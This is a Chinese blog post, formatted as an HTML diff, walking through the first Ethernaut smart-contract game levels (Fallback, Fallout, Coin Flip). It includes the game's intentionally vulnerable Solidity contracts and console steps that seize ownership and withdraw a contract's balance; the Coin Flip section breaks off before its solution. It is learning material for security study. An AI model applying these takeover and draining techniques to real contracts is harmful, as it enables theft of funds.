@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="智能合约有一个入门的游戏平台Ethernaut，拿来学习一下。在做这个之前需要安装谷歌或者火狐浏览器插件MetaMask，并且白嫖几个测试网段的以太币，这个配置可看这篇博客，最多是5个eth（乌兹很行），多了不行。 我就一边做，一边看wp，一边google学习solidity，尽量把注释标详细点。虽说solidity是类似js，但感觉语法有点怪异，慢慢学吧。在这里要感谢前人所写的wp，来来回回翻看">
+<meta property="og:type" content="article">
+<meta property="og:title" content="智能合约入门游戏——Ethernaut">
+<meta property="og:url" content="https://crownz-sec.github.io/2020/05/09/Ethernaut/index.html">
+<meta property="og:site_name" content="crownZ&#39;s Blog">
+<meta property="og:description" content="智能合约有一个入门的游戏平台Ethernaut，拿来学习一下。在做这个之前需要安装谷歌或者火狐浏览器插件MetaMask，并且白嫖几个测试网段的以太币，这个配置可看这篇博客，最多是5个eth（乌兹很行），多了不行。 我就一边做，一边看wp，一边google学习solidity，尽量把注释标详细点。虽说solidity是类似js，但感觉语法有点怪异，慢慢学吧。在这里要感谢前人所写的wp，来来回回翻看">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/crownZ/blog_image/raw/master/20200509192242.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200509164837.png">
+<meta property="og:image" content="https://gitee.com/crownZ/blog_image/raw/master/20200509210444.png">
+<meta property="og:image" content="https://gitee.com/crownZ/blog_image/raw/master/20200509210912.png">
+<meta property="og:image" content="https://gitee.com/crownZ/blog_image/raw/master/20200509212355.png">
+<meta property="og:image" content="https://gitee.com/crownZ/blog_image/raw/master/20200510105632.png">
+<meta property="og:image" content="https://gitee.com/crownZ/blog_image/raw/master/20200510111526.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200627111912.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200627114418.png">
+<meta property="article:published_time" content="2020-05-09T08:00:00.000Z">
+<meta property="article:modified_time" content="2020-06-27T03:44:59.711Z">
+<meta property="article:author" content="crownZ">
+<meta property="article:tag" content="学习">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="以太坊">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/crownZ/blog_image/raw/master/20200509192242.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>智能合约入门游戏——Ethernaut</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2020/05/16/linux_socket/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2020/05/08/recent_thought/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://crownz-sec.github.io/2020/05/09/Ethernaut/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://crownz-sec.github.io/2020/05/09/Ethernaut/&text=智能合约入门游戏——Ethernaut"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://crownz-sec.github.io/2020/05/09/Ethernaut/&title=智能合约入门游戏——Ethernaut"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://crownz-sec.github.io/2020/05/09/Ethernaut/&is_video=false&description=智能合约入门游戏——Ethernaut"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=智能合约入门游戏——Ethernaut&body=Check out this article: https://crownz-sec.github.io/2020/05/09/Ethernaut/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://crownz-sec.github.io/2020/05/09/Ethernaut/&title=智能合约入门游戏——Ethernaut"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://crownz-sec.github.io/2020/05/09/Ethernaut/&title=智能合约入门游戏——Ethernaut"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://crownz-sec.github.io/2020/05/09/Ethernaut/&title=智能合约入门游戏——Ethernaut"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://crownz-sec.github.io/2020/05/09/Ethernaut/&title=智能合约入门游戏——Ethernaut"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://crownz-sec.github.io/2020/05/09/Ethernaut/&name=智能合约入门游戏——Ethernaut&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://crownz-sec.github.io/2020/05/09/Ethernaut/&t=智能合约入门游戏——Ethernaut"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0-Hello-Ethernaut"><span class="toc-number">1.</span> <span class="toc-text">0.Hello Ethernaut</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Fallback"><span class="toc-number">2.</span> <span class="toc-text">1.Fallback</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Fallout"><span class="toc-number">3.</span> <span class="toc-text">2.Fallout</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-Coin-Flip"><span class="toc-number">4.</span> <span class="toc-text">3.Coin Flip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-Telephone"><span class="toc-number">5.</span> <span class="toc-text">4.Telephone</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-Token"><span class="toc-number">6.</span> <span class="toc-text">5.Token</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-Delegation"><span class="toc-number">7.</span> <span class="toc-text">6.Delegation</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        智能合约入门游戏——Ethernaut
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">crownZ</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-05-09T08:00:00.000Z" itemprop="datePublished">2020-05-09</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/">智能合约</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>, <a class="tag-link-link" href="/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/" rel="tag">以太坊</a>, <a class="tag-link-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>智能合约有一个入门的游戏平台<a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/">Ethernaut</a>，拿来学习一下。在做这个之前需要安装谷歌或者火狐浏览器插件MetaMask，并且白嫖几个<strong>测试网段</strong>的以太币，这个配置可看<a target="_blank" rel="noopener" href="https://blog.csdn.net/Fly_hps/article/details/104115231">这篇博客</a>，最多是5个eth（乌兹很行），多了不行。</p>
+<p>我就一边做，一边看wp，一边google学习solidity，尽量把注释标详细点。虽说solidity是类似js，但感觉语法有点怪异，慢慢学吧。在这里要感谢前人所写的wp，来来回回翻看，算是能够做下去。</p>
+<h1 id="0-Hello-Ethernaut"><a href="#0-Hello-Ethernaut" class="headerlink" title="0.Hello Ethernaut"></a>0.Hello Ethernaut</h1><p>这一关主要是了解一下怎么玩这个游戏，按照网页的提示一步步来就可以。每到一关都需要新建实例，做完题目之后点击提交，他会告诉你是否达成目标。而且，如果在交易的时候感觉很慢，可以点击小狐狸中对应账单，多付一点eth来加快交易。做到后面，我恨不得有个设置是默认用高gas来换取更快的打包速度。</p>
+<p>交互可以在开发者工具的console中实现，当然也可以用Remix。Remix在没有没有这种交互环境的时候是必须的，可提前学习一下。</p>
+<p>解题步骤：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract.info()</span><br><span class="line"><span class="string">&quot;You will find what you need in info1().&quot;</span></span><br><span class="line"></span><br><span class="line">contract.info1()</span><br><span class="line"><span class="string">&quot;Try info2(), but with &quot;</span>hello<span class="string">&quot; as a parameter.&quot;</span></span><br><span class="line"></span><br><span class="line">contract.info2(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="string">&quot;The property infoNum holds the number of the next info method to call.&quot;</span></span><br><span class="line"></span><br><span class="line">contract.infoNum()</span><br><span class="line"><span class="number">42</span></span><br><span class="line"></span><br><span class="line">contract.info42()</span><br><span class="line"><span class="string">&quot;theMethodName is the name of the next method.&quot;</span></span><br><span class="line"></span><br><span class="line">contract.theMethodName()</span><br><span class="line"><span class="string">&quot;The method name is method7123949.&quot;</span></span><br><span class="line"></span><br><span class="line">contract.method7123949()</span><br><span class="line"><span class="string">&quot;If you know the password, submit it to authenticate().&quot;</span></span><br><span class="line"></span><br><span class="line">contract.password()</span><br><span class="line"><span class="string">&quot;ethernaut0&quot;</span></span><br><span class="line"></span><br><span class="line">contract.authenticate(<span class="string">&quot;ethernaut0&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="1-Fallback"><a href="#1-Fallback" class="headerlink" title="1.Fallback"></a>1.Fallback</h1><p>过关要求：</p>
+<ol>
+<li>成为合约拥有者</li>
+<li>将余额减少到0</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;zeppelin-solidity/contracts/ownership/Ownable.sol&#x27;</span>;	<span class="comment">//导入所需要的文件</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Fallback is Ownable &#123;	<span class="comment">//is继承关键词，继承自Ownable类，Ownable是主打安保和社区审查的智能合约库</span></span><br><span class="line">  <span class="comment">//继承Ownable的合约，需要在初始化时，设置初始的owner值。构造函数一般初始化拥有者为部署者(msg.sender)。</span></span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public contributions;<span class="comment">//映射contributions，键类型为address，值类型为uint</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Fallback</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;	<span class="comment">//构造函数</span></span><br><span class="line">    contributions[msg.sender] = <span class="number">1000</span> * (<span class="number">1</span> ether);<span class="comment">//将合约拥有者的contributions置为1000ether</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">contribute</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;<span class="comment">//payable关键词表明改函数能够进行交易，改变余额</span></span><br><span class="line">    <span class="built_in">require</span>(msg.value &lt; <span class="number">0.001</span> ether);<span class="comment">//require用来判断是否满足某种条件，这里要求每次msg.value只能小于0.001ether</span></span><br><span class="line">    contributions[msg.sender] = contributions[msg.sender].add(msg.value);<span class="comment">//msg.value包含交易中发送wei的数量</span></span><br><span class="line">    <span class="keyword">if</span>(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getContribution</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;<span class="comment">//转账函数，只有合约拥有者能调用</span></span><br><span class="line">    owner.transfer(<span class="built_in">this</span>.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//合约可以有一个未命名的函数，这个函数不能有参数也不能有返回值，称为回退函数。 </span></span><br><span class="line">  <span class="comment">//两种执行条件：</span></span><br><span class="line">  <span class="comment">//1.如果在一个到合约的调用中，没有其他函数与给定的函数标识匹配（或没有提供调用数据），那么这个函数会被执行。</span></span><br><span class="line">  <span class="comment">//2.而且每当合约收到以太币时，这个函数也会执行。</span></span><br><span class="line">  <span class="comment">//此外，为了接收以太币，fallback函数必须标记为payable。</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> <span class="title">public</span> </span>&#123;	</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt; <span class="number">0</span> &amp;&amp; contributions[msg.sender] &gt; <span class="number">0</span>);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过关要求先成为合约拥有者还要把余额变为0，转账函数只有合约拥有者能够调用，所以先看怎么成为合约拥有者。有两个地方能够变更合约所有权，一个是contribute函数，另一个是回退函数。如果想要反复调用contribute函数来改变拥有者，很不现实，因为要求只能贡献不大于0.001ether，改变拥有者需要1000ether。再看回退函数，当msg.value&gt;0并且所有者贡献大于0，就可以把合约所有者改变为当前用户。</p>
+<p>这里要说一下msg.owner和msg.sender的区别：</p>
+<p>当部署合约时，msg.sender是合约的所有者，是部署该合约的人。如果合约中定义了一个名为“owner”的变量，则可以为其分配值（地址）msg.sender：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address owner = msg.sender;</span><br></pre></td></tr></table></figure>
+
+<p>此时，变量owner将始终具有最初部署合约的人的地址，意味着是合约的所有者。再看这行合约代码：owner.transfer(msg.value)，这里如果调用了它，那么msg.value将传给owner的地址。</p>
+<p>一个合约的msg.sender是当前与合约交互的地址，可以是用户也可以是另一个合约。所以，如果是一个用户和合约交互，msg.sender是该用户的地址；相反，如果是另一个合约B与该合约交互，msg.sender则是合约B的地址。总的来说，msg.sender是当前与某合约交互的用户或另一个合约的地址。</p>
+<p>再来了解一下msg.value，它是保存到合约中的金额，也就是转入到此合约中的金额数。msg.value单位为wei，1eth=1*10^18wei，wei是非常小的。</p>
+<p>回到题目上，我们知道只能从回退函数下手。先调用contribute函数传入1wei，满足条件：contributions[msg.sender] &gt; 0；再进行转账操作，转帐1wei，满足条件：msg.value &gt; 0。这之后，我们便成为拥有者，调用withdraw函数，转走余额。注意，一定是先调用contribute函数，后转账。因为转账时会触发回退函数，其里面的require函数会检测前面的两个条件，不符合就会报错，导致交易失败。</p>
+<p>解题步骤：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract.contribute(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br><span class="line">contract.sendTransaction(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;)</span><br><span class="line">contract.withdraw()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/crownZ/blog_image/raw/master/20200509192242.png"></p>
+<h1 id="2-Fallout"><a href="#2-Fallout" class="headerlink" title="2.Fallout"></a>2.Fallout</h1><p>过关要求：成为合约拥有者。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;zeppelin-solidity/contracts/ownership/Ownable.sol&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Fallout is Ownable &#123;<span class="comment">//继承自Ownable类</span></span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) allocations;<span class="comment">//映射allocations，键类型为address，值类型为uint</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* constructor */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Fal1out</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;<span class="comment">//构造函数，payable关键词表明改函数能够进行交易，改变余额</span></span><br><span class="line">    owner = msg.sender;						<span class="comment">//初始化拥有者为部署者</span></span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allocate</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sendAllocation</span>(<span class="params">address allocator</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(allocations[allocator] &gt; <span class="number">0</span>);<span class="comment">//require用来判断是否满足某种条件，这里是地址余额大于0</span></span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//使用onlyOwner修改器的函数，都因为仅接受所有者调用，将不会接受来自其它用户或合约的调用，从而实现访问控制</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">collectAllocations</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">    msg.sender.transfer(<span class="built_in">this</span>.balance);	<span class="comment">//转走所有余额</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allocatorBalance</span>(<span class="params">address allocator</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;	<span class="comment">//view关键词表明该函数只能读取状态常量，但不能改变其值</span></span><br><span class="line">    <span class="keyword">return</span> allocations[allocator];	</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>整个代码看下来，能改变合约所有权的只有构造函数Fal1out()。但仔细看，它把Fallout()写成了Fal1out()，那么Fal1out()就不是构造函数，题目中的注释只是拿来骗人的。同时Fal1out()没有onlyOwner修饰，这意味着任何人都可以调用该函数。那我们直接调用，那这里我们就相当于msg.sender，就可以成为拥有者了。</p>
+<p>解题步骤：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.Fal1out()    <span class="comment">//contract.owner()用来确认</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200509164837.png"></p>
+<p>这一关提醒我们，构造函数要写好，别出错。看通关后跳出来的讲解，竟然是现实世界的实例，真是有够好笑的呢。这提醒我们，安全一定要注意细节。</p>
+<h1 id="3-Coin-Flip"><a href="#3-Coin-Flip" class="headerlink" title="3.Coin Flip"></a>3.Coin Flip</h1><p>过关要求：连续猜对10次硬币翻转结果。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-solidity/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">CoinFlip</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;<span class="comment">//初始化获胜次数为0</span></span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">flip</span>(<span class="params">bool _guess</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 使用block.blockhash(block.number-1)作为随机数</span></span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number.sub(<span class="number">1</span>)));<span class="comment">//前一个区块的hash值转换为uint256类型</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();		<span class="comment">//回滚到调用前状态</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这一关考察随机数预测，<a target="_blank" rel="noopener" href="https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620">这篇文章</a>进行了总结，这关使用block.blockhash(block.number-1)作为随机数。</p>
+<p>合约开头先定义三个uint256类型数据：consecutiveWins、lastHash、FACTOR，其中FACTOR被赋予了一个很大的数值，是2^255。</p>
+<p>之后的flip函数先定义了一个blockValue，值是前一个区块的hash值转换为uint256类型，block.number为当前的区块数，之后检查lasthash是否等于blockValue，相等则revert，回滚到调用前状态。之后便给lasthash赋值为blockValue，所以lasthash代表的就是上一个区块的hash值。</p>
+<p>之后产生coinflip，它就是拿来判断硬币翻转的结果的，它是拿blockValue/FACTR，前面也提到FACTOR实际是等于2^255，若换成256的二进制就是最左位是0，右边全是1，而我们的blockValue则是256位的，因为solidity里“/”运算会取整，所以coinflip的值其实就取决于blockValue最高位的值是1还是0，换句话说就是跟它的最高位相等，下面的代码就是简单的判断了。</p>
+<p>通过对以上代码的分析我们可以看到硬币翻转的结果其实完全取决于前一个块的hash值，看起来这似乎是随机的，它也确实是随机的。然而事实上它也是可预测的，因为一个区块当然并不只有一个交易，所以我们完全可以先运行一次这个算法，看当前块下得到的coinflip是1还是0然后选择对应的guess，这样就相当于提前看了结果，比开卷考试还牛。</p>
+<p>因为块之间的间隔也只有10s左右，要手工在命令行下完成合约分析中操作还是有点困难，所以我们需要在链上另外部署一个合约来完成这个操作，在部署时可以直接使用Remix。</p>
